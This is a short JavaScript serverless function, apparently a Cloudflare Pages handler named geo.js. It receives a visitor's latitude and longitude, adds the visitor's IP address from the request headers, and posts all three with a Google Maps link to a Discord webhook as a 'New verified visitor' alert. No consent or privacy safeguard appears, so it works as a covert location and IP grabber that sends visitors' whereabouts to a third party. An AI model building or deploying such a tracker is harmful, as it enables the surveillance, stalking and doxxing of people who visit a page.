export async function onRequestPost({ request, env }) {
  try {
    console.log("geo.js invoked");

    const data = await request.json();
    const lat = data.lat;
    const lon = data.lon;
    const ip = request.headers.get("cf-connecting-ip");

    if (!lat || !lon) {
      console.log("Missing location data:", data);
      return new Response("Missing location", { status: 400 });
    }

    if (!env.DISCORD_WEBHOOK) {
      console.error("DISCORD_WEBHOOK not configured.");
      return new Response("Server misconfigured", { status: 500 });
    }

    const msg = {
      content: `🌐 New verified visitor:
**IP:** ${ip}
**Latitude:** ${lat}
**Longitude:** ${lon}
📍 [Google Maps](https://www.google.com/maps?q=${lat},${lon})`
    };

    const webhookRes = await fetch(env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(msg)
    });

    if (!webhookRes.ok) {
      const errorText = await webhookRes.text();
      console.error("Webhook failed:", webhookRes.status, errorText);
      return new Response("Webhook failed", { status: 500 });
    }

    console.log("Successfully sent to Discord.");
    return new Response("Logged", { status: 200 });
  } catch (err) {
    console.error("Error in geo.js:", err);
    return new Response("Server error", { status: 500 });
  }
}